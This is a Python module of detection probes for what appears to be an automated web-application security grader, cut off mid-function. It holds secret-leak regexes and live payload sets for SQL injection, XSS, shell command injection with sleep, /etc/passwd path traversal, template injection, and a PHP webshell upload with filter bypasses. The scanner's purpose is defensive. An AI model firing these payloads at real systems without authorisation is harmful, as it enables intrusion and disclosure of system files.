"""Detection primitives.

- MATCHERS: declarative conditions, (response, arg) -> True when slop is present.
- PREDICATES: oracle conditions for hidden sinks, (ctx) -> True when slop is present.

Slop is always the *presence* of a problem (deduction-only): a matcher/predicate returning True
means the probe fires and adds its penalty.
"""
from __future__ import annotations

import re
import secrets
import statistics
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from dataclasses import replace

import httpx

from . import auth, browser
from .net import make_client
from .schema import Endpoint

_TRACE = re.compile(
    r"Traceback \(most recent call last\)|File \"[^\"]+\", line \d+, in |"
    r"\bat [\w.$]+\([\w.]+:\d+\)"
)


# ---- declarative matchers -------------------------------------------------------------------

def response_leaks_stack_trace(resp, arg=None) -> bool:
    return bool(_TRACE.search(resp.text))


def ttfb_at_least(resp, arg) -> bool:
    # Slice uses one sample; production samples N and takes the median (see FUZZ_RUNNER_SPEC).
    return resp.elapsed.total_seconds() >= float(arg)


def response_contains(resp, arg) -> bool:
    # Reflection check (e.g. an injected XSS marker echoed back unescaped).
    return str(arg) in resp.text


def response_missing_header(resp, arg) -> bool:
    return str(arg) not in resp.headers  # httpx headers are case-insensitive


def response_missing_clickjacking_defense(resp, arg=None) -> bool:
    # Clickjacking is defended by EITHER X-Frame-Options OR a CSP frame-ancestors directive;
    # checking only one header would false-positive on an app that uses the other.
    if "x-frame-options" in resp.headers:
        return False
    return "frame-ancestors" not in resp.headers.get("content-security-policy", "").lower()


def response_cors_misconfigured(resp, arg=None) -> bool:
    # Slop when the app reflects the request Origin into Access-Control-Allow-Origin AND allows
    # credentials: any site can then make credentialed cross-origin reads. Bare ACAO:* is excluded
    # (browsers refuse credentials with *), so this flags only the genuinely exploitable case.
    sent_origin = resp.request.headers.get("origin", "")
    acao = resp.headers.get("access-control-allow-origin", "")
    creds = resp.headers.get("access-control-allow-credentials", "").lower() == "true"
    return bool(sent_origin) and acao == sent_origin and creds


def response_server_error(resp, arg=None) -> bool:
    # A crash is a 5xx the app caused, not 501 (method not implemented) or 405.
    return resp.status_code in (500, 502, 503, 504)


def response_uncompressed(resp, arg=1024) -> bool:
    # Slop: a sizeable TEXT response served with no Content-Encoding (gzip/br/deflate) -> wasted
    # bandwidth and slower loads. Gate on size — small bodies don't benefit from compression, so a
    # server that skips them is correct, not slop. httpx always sends Accept-Encoding and keeps the
    # Content-Encoding header, so its presence means the server compressed.
    ctype = resp.headers.get("content-type", "").lower()
    if not any(t in ctype for t in ("text/", "javascript", "json", "xml", "svg")):
        return False
    if "content-encoding" in resp.headers:
        return False
    return len(resp.content) > int(arg)


def response_has_header(resp, arg) -> bool:
    return str(arg) in resp.headers  # presence is the slop (e.g. X-Powered-By leaks the stack)


def response_is_aws_credentials(resp, arg=None) -> bool:
    # an AWS credentials file served at the webroot — content-signatured so an SPA catch-all 200 (the
    # index shell) doesn't false-positive the way a bare 200 check would.
    t = resp.text.lower()
    return "aws_access_key_id" in t or "aws_secret_access_key" in t


# High-confidence server secrets that must never reach a client. Precision over recall: we skip
# public-by-design values (Firebase apiKey AIza..., Stripe publishable pk_..., generic JWT session
# tokens), because a false positive wrongly penalizes a non-flaw.
_SECRET_PATTERNS = [
    re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----"),
    re.compile(r"\bAKIA[0-9A-Z]{16}\b"),               # AWS access key id
    re.compile(r"\b(?:sk|rk)_live_[0-9A-Za-z]{16,}"),  # Stripe live secret / restricted key
    re.compile(r"\bsk_test_[0-9A-Za-z]{16,}"),         # Stripe test secret key
    re.compile(r"\bghp_[0-9A-Za-z]{36}\b"),            # GitHub personal access token
    re.compile(r"\bgithub_pat_[0-9A-Za-z_]{20,}"),     # GitHub fine-grained PAT
    re.compile(r"\bxox[baprs]-[0-9A-Za-z-]{10,}"),     # Slack token
]


def response_leaks_secret(resp, arg=None) -> bool:
    return any(p.search(resp.text) for p in _SECRET_PATTERNS)


# Credential material an API response must never contain: a populated password-family field, or a
# password-hash signature. High precision by design — password fields are NEVER a legitimate part of
# a response (unlike access/refresh tokens, which ARE the auth flow and are excluded). Masked values
# (***, xxxx, [REDACTED]) and the OpenAPI spec's own schema examples are excluded.
_CRED_FIELD = re.compile(
    r'"(?:password|passwd|pwd|hashed_password|password_hash|pwd_hash|user_password|'
    r'plaintext_password)"\s*:\s*"(?!\s*(?:\*{2,}|x{4,}|redacted|hidden|\.{3})\s*")[^"]{2,}"',
    re.IGNORECASE,
)
_CRED_HASH = re.compile(
    r"\$2[aby]\$\d\d\$[./A-Za-z0-9]{53}"   # bcrypt
    r"|\$argon2(?:id|i|d)\$"                # argon2
    r"|\$6\$[./A-Za-z0-9]{8,}"             # sha512crypt
    r"|\$1\$[./A-Za-z0-9]{6,}"             # md5crypt
    r"|\bpbkdf2_sha256\$\d+\$"             # Django PBKDF2
)
_OPENAPI_DOC = re.compile(r'"(?:openapi|swagger)"\s*:\s*"')


def response_leaks_credentials(resp, arg=None) -> bool:
    if resp.status_code != 200:
        return False
    body = resp.text
    # Excessive data exposure = credentials in a DATA (JSON) response, not in code/markup. A JS bundle
    # with hide?"password":"text" (the Angular/Material password-toggle) is not a leak; genuine secrets
    # hardcoded in JS are caught by response_leaks_secret (key patterns). So require a JSON body.
    ctype = resp.headers.get("content-type", "").lower()
    if "json" not in ctype and body.lstrip()[:1] not in ("{", "["):
        return False
    if _OPENAPI_DOC.search(body[:4000]):
        return False  # a served spec naming a "password" field in its schema isn't a data leak
    return bool(_CRED_FIELD.search(body) or _CRED_HASH.search(body))


# Files that must never be served at the webroot (deploying with .env / .git present is classic
# slop). Each requires status 200 AND a content signature, so a 404 / redirect reads clean.
_DOTENV = re.compile(r"(?im)^[ \t]*(?:export[ \t]+)?[A-Z0-9_]*(?:SECRET|PASSWORD|TOKEN|KEY|CREDENTIAL|DATABASE_URL)[A-Z0-9_]*[ \t]*=")


def response_is_dotenv(resp, arg=None) -> bool:
    return resp.status_code == 200 and bool(_DOTENV.search(resp.text))


def response_is_git_config(resp, arg=None) -> bool:
    return resp.status_code == 200 and "[core]" in resp.text and "repositoryformatversion" in resp.text


def response_is_git_head(resp, arg=None) -> bool:
    # symbolic ref (ref: refs/...) OR a detached-HEAD raw commit SHA
    return resp.status_code == 200 and bool(re.fullmatch(r"ref: refs/\S+|[0-9a-f]{40}", resp.text.strip()))


MATCHERS = {
    "response_leaks_stack_trace": response_leaks_stack_trace,
    "ttfb_at_least": ttfb_at_least,
    "response_contains": response_contains,
    "response_missing_header": response_missing_header,
    "response_missing_clickjacking_defense": response_missing_clickjacking_defense,
    "response_cors_misconfigured": response_cors_misconfigured,
    "response_server_error": response_server_error,
    "response_uncompressed": response_uncompressed,
    "response_has_header": response_has_header,
    "response_is_aws_credentials": response_is_aws_credentials,
    "response_leaks_secret": response_leaks_secret,
    "response_leaks_credentials": response_leaks_credentials,
    "response_is_dotenv": response_is_dotenv,
    "response_is_git_config": response_is_git_config,
    "response_is_git_head": response_is_git_head,
}


# ---- oracle predicates ----------------------------------------------------------------------

def _authed(resp) -> bool:
    return resp.status_code == 200 and "welcome" in resp.text.lower()


def sqli_auth_bypass(ctx, probe) -> bool:
    """Boolean/auth-bypass oracle: a benign login fails, an injection payload succeeds. The
    divergence (only possible if the input reaches a live, unparameterized query) is the slop.
    The payload comes from the probe, so variant-group members reuse one oracle with different
    syntaxes."""
    payload = probe.probe.get("payload", "' OR '1'='1' -- ")
    for endpoint in ctx.profile.form_endpoints or ["/login"]:
        baseline = ctx.client.post(
            endpoint, data={"username": "zzz_no_such_user", "password": "x"}
        )
        attack = ctx.client.post(endpoint, data={"username": payload, "password": "x"})
        if _authed(attack) and not _authed(baseline):
            return True
    return False


# Error-based SQL injection over the API surface discovered from the OpenAPI spec (path params, query
# params, JSON body fields) — the injection points a form-crawler never sees on a JSON API. Precision
# comes from a differential + a DB-error signature: an unbalanced quote must induce a database error
# string the benign baseline never shows. Only GET/POST are probed (never PUT/PATCH/DELETE), so
# grading can't destroy the target's state.
_SQL_ERROR = re.compile(
    r"SQL syntax|SQLITE_ERROR|sqlite3\.(?:Operational|Integrity|Programming|Interface)Error|"
    r"sqlalchemy\.exc|unrecognized token|unterminated quoted string|"
    r"quoted string not properly terminated|you have an error in your sql syntax|mysqlsyntaxerror|"
    r"com\.mysql|psycopg2|PG::\w*Error|PostgreSQL query failed|ORA-\d{5}|Microsoft OLE DB|"
    r"ODBC SQL Server|SQLSTATE\[|Npgsql\.|unclosed quotation mark|incorrect syntax near|\[SQL:\s",
    re.IGNORECASE,
)
_SQLI_BENIGN = "1"
_SQLI_PAYLOAD = "1'"  # a lone quote breaks unparameterized string SQL -> a detectable DB error


def _sqli_slots(ep) -> list[tuple[str, str]]:
    """Injectable positions on an endpoint as (kind, name): path params, query params, body fields."""
    return ([("path", n) for n in ep.path_params]
            + [("query", n) for n in ep.query_params]
            + [("body", n) for n in ep.body_fields])


def _sqli_request(ep, poison, value: str):
    """(path, query_dict, json_body) for ep with the single `poison` slot set to `value` and every
    other slot benign; poison=None yields the all-benign baseline."""
    def sv(kind, name):
        return value if poison == (kind, name) else _SQLI_BENIGN
    path = ep.raw_path
    for n in ep.path_params:
        path = path.replace("{" + n + "}", urllib.parse.quote(sv("path", n), safe=""))
    query = {n: sv("query", n) for n in ep.query_params}
    body = {n: sv("body", n) for n in ep.body_fields} or None
    return path, query, body


# Common query-parameter names to try on a GET endpoint that declares none — a mined SPA path
# (/rest/products/search) or an HTML search form exposes no param schema, so we probe likely names.
_COMMON_PARAMS = ("q", "query", "search", "id", "name", "term", "keyword", "filter")
# Only guess params on GET paths that plausibly take input — keeps the extra requests bounded/precise.
_SEARCHABLE = re.compile(r"search|find|query|filter|lookup|list|products?|items?|users?|orders?", re.I)


def _sqli_targets(profile):
    """Injection targets: OpenAPI/mined endpoints as-is, plus GET HTML forms (fields -> query params)
    and param-less searchable GET endpoints probed with common param names — so a mined
    /rest/products/search and a DVWA-style `?id=` GET form both get exercised, not just declared params."""
    targets = []
    for e in profile.endpoints:
        if (e.method.lower() == "get" and not e.query_params and not e.path_params
                and _SEARCHABLE.search(e.raw_path)):
            targets.append(replace(e, query_params=list(_COMMON_PARAMS)))
        else:
            targets.append(e)
    for f in profile.forms:
        if f.fields and (f.method or "get").lower() == "get":
            targets.append(Endpoint(path=f.action, method="get",
                                    query_params=list(f.fields), raw_path=f.action))
    return targets


# SQLi detection techniques — comprehensive coverage of how ONE flaw ("this parameter reaches an
# unparameterized query") manifests. All share a single finding (the predicate returns once): technique
# breadth is RECALL, not extra penalty. Ordered cheap->expensive; time-based is a bounded last resort.
def _do(c, method, req):
    path, query, body = req
    return c.request(method, path, params=query or None, json=body)


def _tech_error(c, method, reqfn) -> bool:
    """A lone quote induces a DB-error signature (the app leaks SQL errors)."""
    return bool(_SQL_ERROR.search(_do(c, method, reqfn(_SQLI_PAYLOAD)).text))


_SQLI_TRUE = "1' OR '1'='1' -- "
_SQLI_FALSE = "1' OR '1'='2' -- "   # SAME length as TRUE; differs only in the boolean's truth value


def _diverges(a, b) -> bool:
    """Two responses differ materially: status, or a body-size gap too large for equal-length reflected
    payloads to explain."""
    if a.status_code != b.status_code:
        return True
    hi, lo = max(len(a.text), len(b.text)), min(len(a.text), len(b.text))
    return hi - lo > max(64, hi * 0.15)


def _tech_boolean(c, method, reqfn) -> bool:
    """An always-true vs always-false condition (same-length payloads) changes the result set on an
    otherwise-stable endpoint — visible or blind boolean injection."""
    f1 = _do(c, method, reqfn(_SQLI_FALSE))
    f2 = _do(c, method, reqfn(_SQLI_FALSE))
    if _diverges(f1, f2):
        return False  # output not stable across identical calls -> a true/false diff isn't attributable
    return _diverges(_do(c, method, reqfn(_SQLI_TRUE)), f1)


_UNION_MARK = "HLuok42"                                          # the CONCATENATION result; a literal
_UNION_COLS = ("'HLu'||'ok'||'42'", "CONCAT('HLu','ok','42')")  # echo of the payload can't produce it


def _tech_union(c, method, reqfn) -> bool:
    """A UNION SELECT of a concatenated marker executes — the marker appears only if the SQL ran, not
    from reflecting the payload literal. Tries ANSI `||` and MySQL CONCAT across column counts."""
    for expr in _UNION_COLS:
        for n in range(1, 7):
            cols = ",".join([expr] + ["NULL"] * (n - 1))
            if _UNION_MARK in _do(c, method, reqfn("1' UNION SELECT %s -- " % cols)).text:
                return True
    return False


_TIME_PAYLOADS = ("1' OR SLEEP({d}) -- ", "1'||pg_sleep({d})-- ",
                  "1'); SELECT pg_sleep({d})-- ", "1' AND SLEEP({d})=0 -- ")


def _tech_time(c, method, reqfn, delay) -> bool:
    """A time-delay payload measurably slows the response (confirmed twice, to reject jitter) — fully
    blind injection where nothing observable changes but attacker SQL still executes."""
    def elapsed(p):
        t0 = time.perf_counter()
        _do(c, method, reqfn(p))
        return time.perf_counter() - t0
    for tmpl in _TIME_PAYLOADS:
        p = tmpl.format(d=delay)
        if elapsed(p) >= delay * 0.8 and elapsed(p) >= delay * 0.8:
            return True
    return False


_DEEP_SLOTS = 6  # UNION + time are expensive/blind -> run them on at most this many slots


def api_sqli(ctx, probe) -> bool | None:
    """SQL injection across the discovered surface (OpenAPI + mined API paths + HTML GET forms, with
    common-param guessing on param-less searchable GETs). Per injectable slot, tries error-, boolean-,
    UNION-, and time-based detection — one flaw, one finding. N/A when no injectable GET/POST target
    exists; the SQL-error / stability / double-timing guards keep a parameterized app clean."""
    targets = [e for e in _sqli_targets(ctx.profile)
               if e.method.lower() in ("get", "post") and _sqli_slots(e)]
    if not targets:
        return None
    budget = probe.probe.get("max_attempts", 120)
    delay = probe.probe.get("time_delay", 3)
    tested = False
    deep: list = []  # slots deferred to the UNION/time (blind, last-resort) pass
    with make_client(ctx.base_url, ctx.headers, timeout=max(15.0, delay + 8),
                     follow_redirects=False) as c:
        for ep in targets:
            method = ep.method.upper()
            try:
                base = _do(c, method, _sqli_request(ep, None, _SQLI_BENIGN))
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if _SQL_ERROR.search(base.text):
                continue  # baseline already errors for unrelated reasons -> can't attribute injection
            for slot in _sqli_slots(ep):
                if budget <= 0:
                    break
                budget -= 1
                tested = True
                reqfn = (lambda ep=ep, slot=slot: lambda v: _sqli_request(ep, slot, v))()
                try:
                    if _tech_error(c, method, reqfn) or _tech_boolean(c, method, reqfn):
                        return True
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if len(deep) < _DEEP_SLOTS:
                    deep.append((method, reqfn))
            if budget <= 0:
                break
        for method, reqfn in deep:
            try:
                if _tech_union(c, method, reqfn) or _tech_time(c, method, reqfn, delay):
                    return True
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
    return False if tested else None


def _injectable_targets(profile):
    """(action, method, field_names) over the injectable input surface — HTML forms (GET + POST) and
    reflecting/searchable query GETs — shared by the reflection/injection probes (XSS, command
    injection, path traversal)."""
    forms = [(f.action, (f.method or "get").lower(), list(f.fields)) for f in profile.forms if f.fields]
    q_eps = [(e.raw_path, "get", list(e.query_params)) for e in profile.endpoints
             if e.method.lower() == "get" and e.query_params]
    s_eps = [(e.raw_path, "get", list(_COMMON_PARAMS)) for e in profile.endpoints
             if e.method.lower() == "get" and not e.query_params and not e.path_params
             and _SEARCHABLE.search(e.raw_path)]
    return forms + q_eps + s_eps


# Reflected + stored XSS — comprehensive technique coverage of one flaw ("this input is echoed into
# HTML unescaped"), collapsing to a single finding. Each payload targets a different reflection context;
# detection is verbatim, unescaped reflection of a UNIQUE per-run marker (an escaping app encodes the
# `<`/`"` -> the detect string never appears -> clean). The browser dom_xss probe covers execution.
def _xss_payloads(m: str):
    """(inject, detect) per technique — `detect` appears only if `inject` reflects unescaped."""
    return [
        ("<script>%s</script>" % m, "<script>%s</script>" % m),            # script tag in HTML body
        ("<img src=x onerror=%s>" % m, "<img src=x onerror=%s>" % m),      # <img> event handler
        ("<svg onload=%s>" % m, "<svg onload=%s>" % m),                    # <svg> event handler
        ('<a href="javascript:%s">x</a>' % m, 'href="javascript:%s"' % m), # javascript: URI
        ('"><svg onload=%s>' % m, "<svg onload=%s>" % m),                  # break out of an attribute value
        ('" onmouseover=%s x="' % m, '" onmouseover=%s' % m),              # attribute event injection (no <)
        ("</script><svg onload=%s>" % m, "<svg onload=%s>" % m),           # break out of a <script> block
        ("<ScRiPt>%s</ScRiPt>" % m, "<ScRiPt>%s</ScRiPt>" % m),            # case-varied tag (filter bypass)
    ]


_XSS_FILLER = "hlxfill"  # benign value for the fields we're not currently injecting


def _xss_send(c, method, action, data):
    if (method or "get").lower() == "get":
        return c.request("GET", action, params=data)
    return c.request("POST", action, data=data)  # HTML form -> form-encoded body


def _reflects(resp, detect: str) -> bool:
    """The payload reflects unescaped AND in an HTML response — a payload echoed into a JSON API body
    is not XSS (JSON isn't rendered as HTML), so gate on the content type to avoid that false positive."""
    return "html" in resp.headers.get("content-type", "").lower() and detect in resp.text


def xss_injectable(ctx, probe) -> bool | None:
    """Reflected + stored XSS across discovered forms and reflecting query params. Per field, injects
    each payload shape (script / img / svg / javascript-URI / attribute-breakout / script-breakout /
    case-varied) and fires on verbatim unescaped reflection of a unique marker; for POST forms, also
    submits then re-fetches the page to catch STORED XSS. N/A when there's no HTML input surface."""
    targets = _injectable_targets(ctx.profile)
    if not targets:
        return None
    m = "hlx" + secrets.token_hex(4)
    payloads = _xss_payloads(m)
    budget = probe.probe.get("max_attempts", 150)
    tested = False
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as c:
        for action, method, fields in targets:
            for field in fields:
                if budget <= 0:
                    break
                budget -= 1
                tested = True
                # Cheap gate: does this field echo the marker into an HTML response at all? If not, no
                # reflected XSS is possible here -> skip the 8 payload shapes. Keeps breadth across every
                # form affordable (a non-reflecting form costs 1 request/field, not 8).
                try:
                    probe_resp = _xss_send(c, method, action, {fn: (m if fn == field else _XSS_FILLER) for fn in fields})
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if not _reflects(probe_resp, m):
                    continue
                for inject, detect in payloads:
                    if budget <= 0:
                        break
                    budget -= 1
                    data = {fn: (inject if fn == field else _XSS_FILLER) for fn in fields}
                    try:
                        if _reflects(_xss_send(c, method, action, data), detect):
                            return True  # reflected unescaped in an HTML (executable) context -> XSS
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
            if budget <= 0:
                break
            # STORED: submit a script payload, then re-fetch the page — persisted reflection = stored XSS
            if method == "post" and budget > 0:
                budget -= 1
                inject, detect = payloads[0]
                try:
                    _xss_send(c, "post", action, {fn: inject for fn in fields})
                    if _reflects(c.get(action), detect):
                        return True  # persisted across a fresh request -> stored XSS
                except (httpx.HTTPError, httpx.InvalidURL):
                    pass
    return False if tested else None


# OS command injection — comprehensive coverage: shell separators (; | || && newline), command
# substitution ($(...) and backticks), and a blind time-based fallback; one finding. Precision: the
# marker is the RESULT of a shell-evaluated arithmetic expr (13*13 -> 169) — it appears ONLY if a shell
# ran the payload, never from reflecting the literal (which shows the "$((13*13))" text). Execution, not echo.
_CMD_OUT = "hlci169"
_CMD_TAIL = "echo hlci$((13*13))"          # -> hlci169 when a POSIX shell evaluates it
# empty base so the host command fails FAST (`ping ;echo ...`), never hanging on a bogus host arg
_CMD_SEPS = (";%s", "|%s", "||%s", "&&%s", "\n%s", "$(%s)", "`%s`")
_CMD_TIME = (";sleep {d}", "$(sleep {d})", "`sleep {d}`", "&&sleep {d}", "|sleep {d}")


def _elapsed(c, method, action, data) -> float:
    """Seconds for one request; a large sentinel on error so it can't look like a fast baseline."""
    t0 = time.perf_counter()
    try:
        _xss_send(c, method, action, data)
    except (httpx.HTTPError, httpx.InvalidURL):
        return 0.0
    return time.perf_counter() - t0


def command_injection(ctx, probe) -> bool | None:
    """OS command injection across forms + query params. Injects `<sep> echo <arith>` across shell
    separators and command-substitution; fires when the arithmetic RESULT (not the literal) reflects —
    proving a shell executed it. Falls back to blind time-based sleep. N/A when no input surface."""
    targets = _injectable_targets(ctx.profile)
    if not targets:
        return None
    budget = probe.probe.get("max_attempts", 120)
    delay = probe.probe.get("time_delay", 3)
    tested = False
    deep: list = []
    with make_client(ctx.base_url, ctx.headers, timeout=max(15.0, delay + 8), follow_redirects=True) as c:
        for action, method, fields in targets:
            for field in fields:
                if budget <= 0:
                    break
                try:
                    baseline = _xss_send(c, method, action, {fn: (_XSS_FILLER if fn != field else "1") for fn in fields})
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if _CMD_OUT in baseline.text:
                    continue  # already present -> can't attribute to the injection
                for sep in _CMD_SEPS:
                    if budget <= 0:
                        break
                    budget -= 1
                    tested = True
                    inject = sep % _CMD_TAIL
                    data = {fn: (inject if fn == field else _XSS_FILLER) for fn in fields}
                    try:
                        if _CMD_OUT in _xss_send(c, method, action, data).text:
                            return True  # a shell evaluated echo hlci$((13*13)) -> hlci169 -> injectable
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
                if len(deep) < _DEEP_SLOTS:
                    deep.append((action, method, fields, field))
            if budget <= 0:
                break
        for action, method, fields, field in deep:  # blind time-based (no observable output)
            base_time = _elapsed(c, method, action, {fn: (_XSS_FILLER if fn != field else "x") for fn in fields})
            for tmpl in _CMD_TIME:
                data = {fn: (tmpl.format(d=delay) if fn == field else _XSS_FILLER) for fn in fields}
                # delta vs THIS slot's baseline (the host command itself may be slow, e.g. ping) so a
                # naturally-slow endpoint can't false-positive; confirm twice to reject jitter
                if all(_elapsed(c, method, action, data) - base_time >= delay * 0.7 for _ in range(2)):
                    return True
    return False if tested else None


# Server-Side Template Injection + eval-based code injection — user input evaluated as CODE (a template
# expression or an eval'd statement) instead of treated as data -> RCE. Comprehensive across template
# engines AND eval sinks; one finding. Precision by the arithmetic-marker trick (as in command
# injection): the RESULT "<marker>49" appears only if the input was EVALUATED; reflecting the literal
# shows "<marker>{{7*7}}". The unique random marker makes a coincidental "...49" impossible.
_SSTI_EXPRS = (
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{7*7}", "@(7*7)", "*{7*7}", "${{7*7}}",  # template engines
    ";echo 7*7;", "';echo 7*7;//", '";echo 7*7;//', ";print(7*7)#", "<?php echo 7*7;?>",   # eval code sinks
)


def ssti_injectable(ctx, probe) -> bool | None:
    """Template / eval code injection across query params and forms. Injects <marker> + 7*7 in each
    template syntax (Jinja/Twig/Freemarker/ERB/Smarty/Razor/...) and each eval shape (PHP/Python);
    fires when "<marker>49" reflects — the value was computed server-side. N/A when no input surface.
    Query params are tested before forms (template/render sinks are usually GET params)."""
    q = [(e.raw_path, "get", list(e.query_params)) for e in ctx.profile.endpoints
         if e.method.lower() == "get" and e.query_params]
    forms = [(f.action, (f.method or "get").lower(), list(f.fields)) for f in ctx.profile.forms if f.fields]
    s = [(e.raw_path, "get", list(_COMMON_PARAMS)) for e in ctx.profile.endpoints
         if e.method.lower() == "get" and not e.query_params and not e.path_params
         and _SEARCHABLE.search(e.raw_path)]
    targets = q + forms + s
    if not targets:
        return None
    m = "hlssti" + secrets.token_hex(3)
    detect = m + "49"
    payloads = [m + e for e in _SSTI_EXPRS]
    budget = probe.probe.get("max_attempts", 160)
    tested = False
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as c:
        for action, method, fields in targets:
            for field in fields:
                for p in payloads:
                    if budget <= 0:
                        break
                    budget -= 1
                    tested = True
                    data = {fn: (p if fn == field else _XSS_FILLER) for fn in fields}
                    try:
                        if detect in _xss_send(c, method, action, data).text:
                            return True  # 7*7 was evaluated server-side -> template/code injection
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
                if budget <= 0:
                    break
            if budget <= 0:
                break
    return False if tested else None


# Path traversal / local file inclusion — read a file outside the intended directory via a filename
# param. Comprehensive: absolute paths, ../ traversal (raw / doubled / URL-encoded), null-byte, php://
# wrapper; Unix (/etc/passwd) + Windows (win.ini). Detection = the target file's unmistakable content
# signature, which reflecting the path string can never produce -> precise.
_LFI_SIG = re.compile(r"root:.*?:0:0:|\[fonts\]|\[extensions\]|for 16-bit app support", re.IGNORECASE)
_LFI_PARAMS = ("page", "file", "path", "include", "template", "doc", "filename", "load", "view", "dir")
_INCLUDABLE = re.compile(r"fi|includ|file|page|view|download|load|template|doc|read|show", re.IGNORECASE)
_LFI_PAYLOADS = (
    "/etc/passwd", "../../../../../../../etc/passwd", "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd%00", "../../../../etc/passwd%00.png",
    "C:\\Windows\\win.ini", "..\\..\\..\\..\\..\\Windows\\win.ini",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
)


def path_traversal(ctx, probe) -> bool | None:
    """Path traversal / LFI across forms, discovered query params, and common filename params on
    includable-looking GET routes. Injects absolute / relative / encoded / null-byte / php-wrapper
    payloads for /etc/passwd and win.ini; fires on the file's content signature. N/A when no surface."""
    # LFI is a GET-filename vuln -> test query params + includable routes FIRST, forms last, so a large
    # form set can't exhaust the budget before the real vector (a ?page=/?file=) is reached.
    q = [(e.raw_path, "get", list(e.query_params)) for e in ctx.profile.endpoints
         if e.method.lower() == "get" and e.query_params]
    incl = [(rt, "get", list(_LFI_PARAMS)) for rt in ctx.profile.routes if _INCLUDABLE.search(rt)]
    forms = [(f.action, (f.method or "get").lower(), list(f.fields)) for f in ctx.profile.forms if f.fields]
    targets = q + incl + forms
    if not targets:
        return None
    budget = probe.probe.get("max_attempts", 200)
    tested = False
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as c:
        for action, method, fields in targets:
            for field in fields:
                for payload in _LFI_PAYLOADS:
                    if budget <= 0:
                        break
                    budget -= 1
                    tested = True
                    data = {fn: (payload if fn == field else _XSS_FILLER) for fn in fields}
                    try:
                        if _LFI_SIG.search(_xss_send(c, method, action, data).text):
                            return True  # returned the contents of a system file -> traversal/LFI
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
                if budget <= 0:
                    break
            if budget <= 0:
                break
    return False if tested else None


# Insecure file upload — comprehensive filter-bypass coverage: a PHP webshell accepted despite
# extension / content-type / double-extension / null-byte / magic-byte controls, then EXECUTED. The
# payload echoes an arithmetic expression (hlup + 7*7 -> "hlup49x"); "hlup49x" in the FETCHED file
# proves server-side execution (the stored SOURCE shows "(7*7)", never "49") -> RCE, not mere storage.
_UPLOAD_MARK = "hlup49x"
_UPLOAD_PHP = b"<?php echo 'hlup'.(7*7).'x'; ?>"
_GIF_MAGIC = b"GIF89a"                     # a real image magic header to defeat content-sniffing
_UPLOAD_DIRS = ("", "uploads/", "upload/", "files/", "file/", "images/", "img/", "media/",
                "hackable/uploads/", "assets/uploads/", "static/uploads/", "tmp/", "data/uploads/")


def _upload_variants():
    """(filename, content_type, body) across the standard upload-filter bypasses."""
    return [
        ("hlshell.php", "application/x-php", _UPLOAD_PHP),                # unrestricted
        ("hlshell.php", "image/jpeg", _UPLOAD_PHP),                      # content-type spoof
        ("hlshell.jpg.php", "image/jpeg", _UPLOAD_PHP),                  # double extension
        ("hlshell.php.jpg", "image/jpeg", _UPLOAD_PHP),                  # trailing extension
        ("hlshell.phtml", "image/jpeg", _UPLOAD_PHP),                    # alternate PHP extension
        ("hlshell.php\x00.jpg", "image/jpeg", _UPLOAD_PHP),             # null-byte truncation
        ("hlshell.php", "image/gif", _GIF_MAGIC + b"\n" + _UPLOAD_PHP),  # magic-byte spoof + PHP
    ]


def _locate_upload(resp_text: str, filename: str) -> list[str]:
    """Candidate URLs for the just-uploaded file: any path in the response naming it, then common
    upload directories."""
    base = filename.split("\x00")[0].split("/")[-1]
    urls = ["/" + m.lstrip("./").lstrip("/")
            for m in re.findall(r"[\w./-]*" + re.escape(base), resp_text)]
    urls += ["/" + d + base for d in _UPLOAD_DIRS]
    return list(dict.fromkeys(urls))


def file_upload(ctx, probe) -> bool | None:
    """Insecure file upload across multipart forms with a file field: upload a PHP webshell in several
    filter-bypass shapes, locate it (from the response or common upload dirs), fetch it, and fire when
    it EXECUTES (arithmetic marker). N/A when there's no file-upload form."""
    forms = [f for f in ctx.profile.forms if f.file_fields]
    if not forms:
        return None
    tested = False
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        for f in forms:
            for filename, ctype, body in _upload_variants():
                tested = True
                files = {ff: (filename, body, ctype) for ff in f.file_fields}
                data = {fn: _XSS_FILLER for fn in f.fields if fn not in f.file_fields}
                try:
                    resp = c.request((f.method or "post").upper(), f.action, files=files, data=data)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                for url in _locate_upload(resp.text, filename):
                    try:
                        if _UPLOAD_MARK in c.get(url).text:
                            return True  # the uploaded PHP executed server-side -> RCE via upload
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
    return False if tested else None


# API BOLA / horizontal IDOR (OWASP API-Security #1): an object created by user A is readable by
# user B. Verified with a planted canary — B's read must return A's SECRET value (not just a 2xx, and
# not the id A chose, which legitimately echoes back), so a token-scoped or no-op endpoint can't false
# -positive. Guarded on the read being auth-gated (unauth -> 401/403), so a public endpoint isn't BOLA.
def _bola_pairs(endpoints):
    """(create, read, param, id_field) tuples: a POST-with-body create paired with a GET read whose
    single path param sits on the same collection. id_field = the create body field that supplies the
    id (when the path param names one), else None (the id comes from the create response)."""
    creates = [e for e in endpoints if e.method.lower() == "post" and e.body_fields]
    pairs = []
    for r in endpoints:
        if r.method.lower() != "get" or len(r.path_params) != 1:
            continue
        param = r.path_params[0]
        collection = r.raw_path.rsplit("/", 1)[0]
        if r.raw_path != collection + "/{" + param + "}":
            continue  # param must be the final path segment (a resource id), not mid-path
        for c in creates:
            if c.raw_path.rstrip("/") == collection:
                pairs.append((c, r, param, param if param in c.body_fields else None))
    return pairs


def _created_id(resp):
